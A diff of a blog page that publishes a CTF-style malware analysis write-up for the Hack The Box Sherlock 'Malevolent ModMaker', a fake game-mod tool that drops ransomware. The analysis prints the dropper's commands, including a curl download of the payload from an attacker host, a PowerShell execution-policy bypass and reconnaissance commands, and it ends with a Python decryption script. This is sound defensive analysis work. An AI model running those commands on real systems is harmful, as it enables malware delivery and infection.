@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Malevolent ModMaker - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/Malevolent ModMaker.html" />
     <!-- Sherlock-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Malevolent ModMaker sherlock - Medium difficulty level">
+    <meta name="description" content="Writeup for Malevolent ModMaker sherlock - Medium difficulty level">
     <meta name="keywords" content="Sherlock, Malevolent ModMaker, Medium, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
 </head>
 <body>
@@ -64,16 +64,149 @@
         <h1 class="writeup-title">Malevolent ModMaker</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active sherlock</span>
+            <span class="date">January 8, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Sherlock-specific content goes here -->
-                <p><img alt="MMM" src="../images/Malevolent ModMaker/solved.png" /></p>
-<p>Malevolent ModMaker is an <strong>ACTIVE</strong> sherlock!</p>
-<p>This write-up will go live once Malevolent ModMaker retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the sherlock is still live.</p>
+                <p><img alt="solved" src="../images/Malevolent ModMaker/solved.png" /></p>
+<pre class="codehilite"><code>Bob, a senior software engineer at Acme Inc., was taking a break from correcting AI code to check in with his favorite gaming community.
+One of the newer members shared a new program that can make mods for a popular game. Eager to try new things, when he ran it as administrator (as instructed), all of his files were deleted and replaced!
+He immediately called the help desk, so they locked his machine and an incident response was called!
+</code></pre>
+
+<h1>Task 1</h1>
+<p><code>Right from the start, based on the incident details, the .TXT file's contents, and the extension appended to the other .TXT file, what type of malware infection is this?</code></p>
+<p>The challenge archive contains 3 executable files, an encrypted file with a suspicious extension, and a text note.</p>
+<p><img alt="files" src="../images/Malevolent ModMaker/files.png" /></p>
+<p>Ransomware is a type of software that makes files unusable, then demands something in return (usually money) for the decryption key.</p>
+<p>The text file is actually a ransom note, with instructions on how to get the files back. Since the encrypted file's extension is <code>.goteem</code>, I'll assume that the goteem.exe file is the actual ransomware.</p>
+<p><img alt="task1" src="../images/Malevolent ModMaker/task1.png" /></p>
+<h1>Task 2</h1>
+<p><code>What mechanism does MCModMaker-v.1.4.exe use to send information back to the C2 server?</code></p>
+<p>Running DIE(Detect It Easy) against this file reveals that it was written in GO.</p>
+<p><img alt="golang" src="../images/Malevolent ModMaker/golang.png" /></p>
+<p>I'll open the program in Ghidra, and I'll navigate to its main function <code>main.main</code></p>
+<p><img alt="ghidra" src="../images/Malevolent ModMaker/ghidra.png" /></p>
+<p>The <code>main.sendToDiscord</code> function is called, with a Discord webhook passed into it as an argument. A webhook is a way for one application to send real-time data to another when something happens. In this case, the malware is sending some kind of data to a Discord application.</p>
+<p><img alt="task2" src="../images/Malevolent ModMaker/task2.png" /></p>
+<h1>Task 3</h1>
+<p><code>What command does MCModMaker-v.1.4.exe run suggesting that it is meant to execute other binaries or scripts?</code></p>
+<p><img alt="execution" src="../images/Malevolent ModMaker/execution.png" /></p>
+<p>Here, I can see 8 data structures being passed into the <code>runCommand</code> function. In the order of appearance, they are:</p>
+<pre class="codehilite"><code>whoami
+
+hostname
+
+ipconfig
+
+dir
+
+curl https://hunnid.htb/api/v2/country,city/vpn?apikey=ZVBOKX3P8H7`
+
+curl -o goteem.exe http://goteem.htb:8080/goteem.exe
+
+powershell -ep -bypass
+
+./goteem.exe
+</code></pre>
+
+<p>The malware first collects information about the machine with the first 4 commands, grabs a different executable from its C2 server, and sends the data to the attacker via a Discord webhook, before executing goteem.exe</p>
+<p>Data is separated with newlines, with careful consideration of Discord's message limit. It is then gradually passed into the <code>SendToDiscord</code> function, along with the webhook URL.</p>
+<p>Going back to the question, <code>powershell -ep -bypass</code> is used to bypass execution policy. Execution policy blocks untrusted scripts from running, but does not block .exe files. Bypassing it will allow an attacker to run any commands they wish.</p>
+<p><img alt="task3" src="../images/Malevolent ModMaker/task3.png" /></p>
+<h1>Task 4</h1>
+<p><code>What is the value of the API key contained within the URL which suggests it enumerates geolocation data?</code></p>
+<p>The value of this key is <code>apikey=ZVBOKX3P8H7</code>. Looking at the whole link, the malware polls hunnid.htb for the country and city of the device, and authenticates with the mentioned apikey.</p>
+<p><img alt="task4" src="../images/Malevolent ModMaker/task4.png" /></p>
+<h1>Task 5</h1>
+<p><code>What domain is the C2 server that serves the ransomware payload?</code></p>
+<p>The attacker curled a different executable from <code>goteem.htb</code>. The challenge archive contains it as well, and aside from these two, I know that <code>bruh.exe</code> is supposed to be the decryptor. Goteem.exe is the payload.</p>
+<p><img alt="task5" src="../images/Malevolent ModMaker/task5.png" /></p>
+<h1>Task 6</h1>
+<p><code>While analyzing the MCModMaker-v.1.4.exe, what format is the data that is returned to the C2 server?</code></p>
+<p>I'll investigate the <code>sendToDiscord</code> function itself next. This is where the data lands after getting processed by main.main.</p>
+<p><img alt="ghidra2" src="../images/Malevolent ModMaker/ghidra2.png" /></p>
+<p>The string data <code>pvVar1</code> is wrapped in a <code>DiscordMessage</code> struct, and encoded to JSON. This is already enough base to say that it uses application/json content type.</p>
+<p>It then creates and sends a POST request with set headers. Looking at line 88, I can see another data structure, which corresponds to <code>application/json</code> </p>
+<p><img alt="ghidra3" src="../images/Malevolent ModMaker/ghidra3.png" /></p>
+<p>Lastly, it checks for the status code with <code>if ((pnVar4-&gt;StatusCode != 0xcc) &amp;&amp; (pnVar4-&gt;StatusCode != 200)</code>, and throws errors if the code is not 200 OR 204(0xcc). It then uses <code>main.sendToDiscord.deferwrap1((.closure *)local_10)</code>to close the HTTP response body when the funciton exits.</p>
+<p><img alt="task6" src="../images/Malevolent ModMaker/task6.png" /></p>
+<h1>Task 7</h1>
+<p><code>What specific filetype is enumerated by goteem.exe for encryption?</code></p>
+<p>Right after loading goteem.exe into Ghidra, I noticed a few things.</p>
+<p><img alt="ghidra4" src="../images/Malevolent ModMaker/ghidra4.png" /></p>
+<p>I can see a string <code>C://Users</code>, as well as the environment being loaded in at line 96.</p>
+<p>The array under local_58 holds values <code>Downloads</code> and <code>Documents</code>, most certainly directory names.</p>
+<p>A <code>findTxtFiles</code> function is called, which gradually walks every <code>C:/Users/X</code> dir for users, and every user for their documents/downloads dirs.</p>
+<p><img alt="ghidra5" src="../images/Malevolent ModMaker/ghidra5.png" /></p>
+<p>The <code>findtXTFiles.func1</code> function loops through the found directories, and searches for .txt files (7478742e in ASCII is <code>.txt</code>).</p>
+<p><img alt="task6" src="../images/Malevolent ModMaker/task7.png" /></p>
+<h1>Task 8</h1>
+<p><code>What is the full string that's displayed when goteem.exe enumerates a restricted Windows folder?</code></p>
+<p>This string is listed a bit earlier in the function. When the ransomware finds a restricted folder, it will return <code>Skipping directory: %s (access denied).</code></p>
+<p><img alt="ghidra7" src="../images/Malevolent ModMaker/ghidra7.png" /></p>
+<p><img alt="task8" src="../images/Malevolent ModMaker/task8.png" /></p>
+<h1>Task 9</h1>
+<p><code>Within the encryptFile function, in case file was read successfully, what is the function name found at the call instruction?</code></p>
+<p>Since I have the function name, I can just navigate to it directly. This function is responsible for reading the file, deleting the original, and replacing it with its encrypted version (with the .goteem extension).</p>
+<p><img alt="ghidra8" src="../images/Malevolent ModMaker/ghidra8.png" /></p>
+<p>If the file was read into memory successfully, the first function called will be <code>crypto/aes.NewCipher</code>, the accepted answer being <code>crypto_aes_NewCipher</code></p>
+<p><img alt="task9" src="../images/Malevolent ModMaker/task9.png" /></p>
+<h1>Task 10</h1>
+<p><code>What is the decryption key?</code></p>
+<p>Normally, I would track down the key by investigating the nearby variables... But earlier in main.main, I remembered seeing a few suspicious lines.</p>
+<p><img alt="ghidra9" src="../images/Malevolent ModMaker/ghidra9.png" /></p>
+<p>This decoded string is then passed together with the .txt files array into a wrapper function.</p>
+<p><img alt="ghidra10" src="../images/Malevolent ModMaker/ghidra10.png" /></p>
+<p>The <code>gowrap1</code> function is just a wrapper for the encryptFile function.</p>
+<p><img alt="ghidra11" src="../images/Malevolent ModMaker/ghidra11.png" /></p>
+<p><img alt="task10" src="../images/Malevolent ModMaker/task10.png" /></p>
+<h1>Task 11</h1>
+<p><code>What is the name of the project in the encrypted .TXT file?</code></p>
+<p>Looking further into the encryption function, I can see that it uses AES-GCM for encryption, with a random, 12-byte nonce added at the start of a file.</p>
+<p><img alt="ghidra13" src="../images/Malevolent ModMaker/ghidra13.png" /></p>
+<p>This is generally safe, as the nonce doesn't have to be a secret. It just needs to be unique for every file, and this malware does it correctly.</p>
+<p>I'll create a script that performs AES-GCM decryption of .goteem files with this key, carving out the nonce AND the authentication tag.</p>
+<pre class="codehilite"><code># decrypt.py
+
+import os                                                                                                                                                                                                                                   
+import sys                                                                                                                                                                                                                                  
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+
+def decrypt_aes_gcm(encrypted_file_path, output_file_path, key_hex):
+    key = bytes.fromhex(key_hex)
+
+    with open(encrypted_file_path, 'rb') as f:
+        nonce = f.read(12)
+
+        data = f.read()
+
+        ciphertext = data[:-16]
+        tag = data[-16:]
+
+    try:
+        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+
+        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
+
+        sys.stdout.buffer.write(plaintext)
+    except Exception:
+        print(&quot;FAILED&quot;)
+
+MY_KEY = &quot;6368616e676520746869732070617373&quot;
+INPUT_FILE = &quot;probably_important.txt.goteem&quot;
+OUTPUT_FILE = &quot;probably_important.txt&quot;
+
+decrypt_aes_gcm(INPUT_FILE, OUTPUT_FILE, MY_KEY)
+</code></pre>
+
+<p><img alt="project" src="../images/Malevolent ModMaker/project.png" /></p>
+<p><img alt="task11" src="../images/Malevolent ModMaker/task11.png" /></p>
+<p>Solved!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -92,7 +225,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
